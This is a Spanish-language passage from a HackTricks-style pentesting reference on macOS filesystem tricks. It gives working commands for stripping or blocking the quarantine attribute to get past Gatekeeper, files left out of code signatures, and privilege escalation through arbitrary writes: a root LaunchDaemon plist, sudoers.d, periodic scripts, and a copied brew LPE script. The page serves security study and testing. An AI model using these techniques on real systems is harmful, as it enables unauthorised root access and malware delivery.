# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## Combinaciones de permisos POSIX

Permisos en un **directorio**:

- **lectura** - puedes **enumerar** las entradas del directorio
- **escritura** - puedes **eliminar/escribir** **archivos** en el directorio y puedes **eliminar carpetas vacías**.
- Pero **no puedes eliminar/modificar carpetas no vacías** a menos que tengas permisos de escritura sobre ellas.
- **no puedes modificar el nombre de una carpeta** a menos que seas el propietario.
- **ejecutar** - se te **permite recorrer** el directorio - si no tienes este derecho, no puedes acceder a ningún archivo dentro de él, ni en ningún subdirectorio.

### Combinaciones Peligrosas

**Cómo sobrescribir un archivo/carpeta propiedad de root**, pero:

- Un **propietario de directorio** padre en la ruta es el usuario
- Un **propietario de directorio** padre en la ruta es un **grupo de usuarios** con **acceso de escritura**
- Un **grupo** de usuarios tiene acceso de **escritura** al **archivo**

Con cualquiera de las combinaciones anteriores, un atacante podría **inyectar** un **enlace simbólico/duro** en la ruta esperada para obtener una escritura arbitraria privilegiada.

### Caso especial de carpeta root R+X

Si hay archivos en un **directorio** donde **solo root tiene acceso R+X**, esos **no son accesibles para nadie más**. Así que una vulnerabilidad que permita **mover un archivo legible por un usuario**, que no puede ser leído debido a esa **restricción**, de esta carpeta **a otra diferente**, podría ser abusada para leer estos archivos.

Ejemplo en: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Enlace simbólico / Enlace duro

Si un proceso privilegiado está escribiendo datos en un **archivo** que podría ser **controlado** por un **usuario de menor privilegio**, o que podría haber sido **creado previamente** por un usuario de menor privilegio. El usuario podría simplemente **apuntarlo a otro archivo** a través de un enlace simbólico o duro, y el proceso privilegiado escribirá en ese archivo.

Consulta en las otras secciones donde un atacante podría **abusar de una escritura arbitraria para escalar privilegios**.

## .fileloc

Los archivos con extensión **`.fileloc`** pueden apuntar a otras aplicaciones o binarios, por lo que cuando se abren, la aplicación/binario será el que se ejecute.\
Ejemplo:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## FD Arbitrario

Si puedes hacer que un **proceso abra un archivo o una carpeta con altos privilegios**, puedes abusar de **`crontab`** para abrir un archivo en `/etc/sudoers.d` con **`EDITOR=exploit.py`**, de modo que `exploit.py` obtenga el FD del archivo dentro de `/etc/sudoers` y lo abuse.

Por ejemplo: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Evitar trucos de xattrs de cuarentena

### Eliminarlo
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Si un archivo/carpeta tiene este atributo inmutable, no será posible poner un xattr en él.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

Un **devfs** mount **no soporta xattr**, más información en [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Este ACL impide agregar `xattrs` al archivo.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

El formato de archivo **AppleDouble** copia un archivo incluyendo sus ACEs.

En el [**código fuente**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) es posible ver que la representación de texto de la ACL almacenada dentro del xattr llamado **`com.apple.acl.text`** se establecerá como ACL en el archivo descomprimido. Así que, si comprimiste una aplicación en un archivo zip con el formato de archivo **AppleDouble** con una ACL que impide que otros xattrs sean escritos en él... el xattr de cuarentena no se estableció en la aplicación:

Consulta el [**informe original**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) para más información.

Para replicar esto, primero necesitamos obtener la cadena acl correcta:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note que incluso si esto funciona, el sandbox escribe el xattr de cuarentena antes)

No es realmente necesario, pero lo dejo ahí por si acaso:

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass Code Signatures

Los bundles contienen el archivo **`_CodeSignature/CodeResources`** que contiene el **hash** de cada **archivo** en el **bundle**. Tenga en cuenta que el hash de CodeResources también está **incrustado en el ejecutable**, por lo que no podemos interferir con eso, tampoco.

Sin embargo, hay algunos archivos cuya firma no será verificada, estos tienen la clave omitida en el plist, como:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Es posible calcular la firma de un recurso desde la línea de comandos con:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montar dmgs

Un usuario puede montar un dmg personalizado creado incluso sobre algunas carpetas existentes. Así es como podrías crear un paquete dmg personalizado con contenido personalizado:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Usualmente, macOS monta discos comunicándose con el servicio Mach `com.apple.DiskArbitration.diskarbitrationd` (proporcionado por `/usr/libexec/diskarbitrationd`). Si se agrega el parámetro `-d` al archivo plist de LaunchDaemons y se reinicia, almacenará registros en `/var/log/diskarbitrationd.log`.\
Sin embargo, es posible utilizar herramientas como `hdik` y `hdiutil` para comunicarse directamente con el kext `com.apple.driver.DiskImages`.

## Escrituras Arbitrarias

### Scripts sh periódicos

Si tu script pudiera ser interpretado como un **script de shell**, podrías sobrescribir el **`/etc/periodic/daily/999.local`** script de shell que se activará todos los días.

Puedes **fingir** una ejecución de este script con: **`sudo periodic daily`**

### Daemons

Escribe un **LaunchDaemon** arbitrario como **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** con un plist que ejecute un script arbitrario como:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Simplemente genera el script `/Applications/Scripts/privesc.sh` con los **comandos** que te gustaría ejecutar como root.

### Archivo Sudoers

Si tienes **escritura arbitraria**, podrías crear un archivo dentro de la carpeta **`/etc/sudoers.d/`** otorgándote privilegios de **sudo**.

### Archivos PATH

El archivo **`/etc/paths`** es uno de los principales lugares que llena la variable de entorno PATH. Debes ser root para sobrescribirlo, pero si un script de **proceso privilegiado** está ejecutando algún **comando sin la ruta completa**, podrías ser capaz de **secuestrarlo** modificando este archivo.

También puedes escribir archivos en **`/etc/paths.d`** para cargar nuevas carpetas en la variable de entorno `PATH`.

## Generar archivos escribibles como otros usuarios

Esto generará un archivo que pertenece a root y que es escribible por mí ([**código de aquí**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). Esto también podría funcionar como privesc:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## Memoria Compartida POSIX

**La memoria compartida POSIX** permite que los procesos en sistemas operativos compatibles con POSIX accedan a un área de memoria común, facilitando una comunicación más rápida en comparación con otros métodos de comunicación entre procesos. Implica crear o abrir un objeto de memoria compartida con `shm_open()`, establecer su tamaño con `ftruncate()`, y mapearlo en el espacio de direcciones del proceso usando `mmap()`. Los procesos pueden luego leer y escribir directamente en esta área de memoria. Para gestionar el acceso concurrente y prevenir la corrupción de datos, a menudo se utilizan mecanismos de sincronización como mutexes o semáforos. Finalmente, los procesos desmapean y cierran la memoria compartida con `munmap()` y `close()`, y opcionalmente eliminan el objeto de memoria con `shm_unlink()`. Este sistema es especialmente efectivo para IPC eficiente y rápido en entornos donde múltiples procesos necesitan acceder a datos compartidos rápidamente.

<details>

<summary>Ejemplo de Código del Productor</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Ejemplo de Código del Consumidor</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## Descriptores Protegidos de macOS

**Descriptores protegidos de macOS** son una característica de seguridad introducida en macOS para mejorar la seguridad y fiabilidad de las **operaciones de descriptores de archivo** en aplicaciones de usuario. Estos descriptores protegidos proporcionan una forma de asociar restricciones específicas o "guardias" con descriptores de archivo, que son aplicadas por el kernel.

Esta característica es particularmente útil para prevenir ciertas clases de vulnerabilidades de seguridad, como **acceso no autorizado a archivos** o **condiciones de carrera**. Estas vulnerabilidades ocurren cuando, por ejemplo, un hilo está accediendo a una descripción de archivo dando **acceso a otro hilo vulnerable sobre ella** o cuando un descriptor de archivo es **heredado** por un proceso hijo vulnerable. Algunas funciones relacionadas con esta funcionalidad son:

- `guarded_open_np`: Abre un FD con una guardia
- `guarded_close_np`: Ciérralo
- `change_fdguard_np`: Cambia las banderas de guardia en un descriptor (incluso eliminando la protección de guardia)

## Referencias

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)

{{#include ../../../../banners/hacktricks-training.md}}
